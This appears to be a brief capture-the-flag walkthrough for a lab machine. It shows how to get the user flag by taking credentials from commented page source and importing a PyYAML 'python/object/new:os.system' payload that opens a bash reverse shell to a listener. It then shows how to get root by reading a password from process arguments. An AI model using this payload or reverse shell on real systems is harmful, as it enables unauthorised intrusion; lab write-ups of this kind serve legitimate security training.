1) Obtaining the user flag

Navigate the machine url and view the commented feild in the page code

(valid login creds)

startup a listenner with nc

Then log in and import a shell.yaml file or paste

!!python/object/new:os.system [
  'bash -c "bash -i >& /dev/tcp/lHost/lPort 0>&1"'
]

as the playlist yaml

Flag can be found at the Bartender home directory



2) Obtaining the root flag

use the command ps aux | grep root

Notice the command running with the root users password?

hint:  command - jukeboxd.py and has flag --stream-pass <rootPasswd>

Stabilize the shell with python3 -c 'import pty; pty.spawn("/bin/bash")'

Then log in as the root user

Root flag at /root/root.txt

